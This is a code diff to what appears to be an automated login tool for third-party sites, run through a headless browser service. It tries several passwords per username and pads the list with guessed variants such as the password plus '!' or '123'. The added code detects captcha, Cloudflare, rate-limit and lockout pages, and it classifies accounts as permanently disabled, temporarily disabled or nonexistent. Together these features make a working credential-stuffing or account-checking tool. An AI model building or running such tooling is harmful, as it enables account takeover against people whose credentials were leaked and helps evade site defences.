@@ -247,11 +247,25 @@ async function v7PerformLoginOnPage(page, site, username, passwords, recordingMo
         break;
       }
       
-      if (pageText.includes('disabled') || pageText.includes('blocked')) {
+      if (pageText.includes('been disabled') || pageText.includes('permanently disabled')) {
         earlyStop = true;
-        earlyStopReason = 'disabled';
+        earlyStopReason = 'permdisabled';
         break;
       }
+      if (pageText.includes('temporarily disabled') || pageText.includes('try again in')) {
+        earlyStop = true;
+        earlyStopReason = 'tempdisabled';
+        break;
+      }
+      if (pageText.includes('disabled') || pageText.includes('blocked') || pageText.includes('captcha')) {
+        earlyStop = true;
+        earlyStopReason = 'blocked';
+        break;
+      }
+    }
+    if (!markerFound && !earlyStop && passwords.length >= 4) {
+      earlyStop = true;
+      earlyStopReason = 'noaccount';
     }
   } catch (e) {
     debugReport.error = e.message;
@@ -408,6 +422,16 @@ async function v7AttemptLogin({ browserlessUrl, site, username, passwords, scree
             break;
           }
           
+          if (pageText.includes('been disabled') || pageText.includes('permanently disabled')) {
+            earlyStop = true;
+            earlyStopReason = 'permdisabled';
+            break;
+          }
+          if (pageText.includes('temporarily disabled') || pageText.includes('try again in')) {
+            earlyStop = true;
+            earlyStopReason = 'tempdisabled';
+            break;
+          }
           const blockMarkers = ['disabled', 'blocked', 'captcha', 'cloudflare', 'security check', 'access denied', "verify it's you", 'robot', 'hcaptcha', 'too many requests', 'rate limit', 'suspended', 'forbidden', 'unusual activity'];
           const foundMarker = blockMarkers.find(m => pageText.includes(m));
           if (foundMarker) {
@@ -415,6 +439,10 @@ async function v7AttemptLogin({ browserlessUrl, site, username, passwords, scree
             earlyStopReason = "blocked_by_" + foundMarker.replace(/ /g, '_');
             break;
           }
+        }
+        if (!markerFound && !earlyStop && passwords.length >= 4) {
+          earlyStop = true;
+          earlyStopReason = 'noaccount';
         }
       } catch (e) {
         debugReport.error = e.message;
@@ -754,7 +782,20 @@ Deno.serve(async (req) => {
     const browserlessUrl = buildBrowserlessUrl(apiKey, site, sessionTimeout);
 
     // Combine primary and variant passwords
-    const passwords = [password, ...((password_variants || []).filter(Boolean))];
+    let passwords = [password, ...((password_variants || []).filter(Boolean))];
+    if (passwords.length >= 4) {
+      passwords = passwords.slice(0, 4);
+      passwords[3] = passwords[2];
+    } else {
+      if (passwords.length === 1) {
+        passwords.push(password + "!");
+        passwords.push(password + "!!");
+      } else if (passwords.length === 2) {
+        passwords.push(passwords[1] + "!");
+      }
+      while (passwords.length < 3) passwords.push(password + "123");
+      passwords[3] = passwords[2];
+    }
     let lastResult = null;
     let workingPassword = null;
     let fallbackToLegacy = false;
@@ -784,7 +825,14 @@ Deno.serve(async (req) => {
       if (r.error) throw new Error(r.error);
 
       // V7 early-stop rules evaluate permanent bans directly
-      const status = r.earlyStop ? 'failed' : classify(site, r.finalUrl, r.markerFound);
+      let status = classify(site, r.finalUrl, r.markerFound);
+      if (r.earlyStop) {
+        if (['permdisabled', 'tempdisabled', 'noaccount'].includes(r.earlyStopReason)) {
+          status = r.earlyStopReason;
+        } else {
+          status = 'failed';
+        }
+      }
       
       lastResult = { ...r, status, error_message: r.earlyStopReason || '' };
       workingPassword = r.workingPassword;
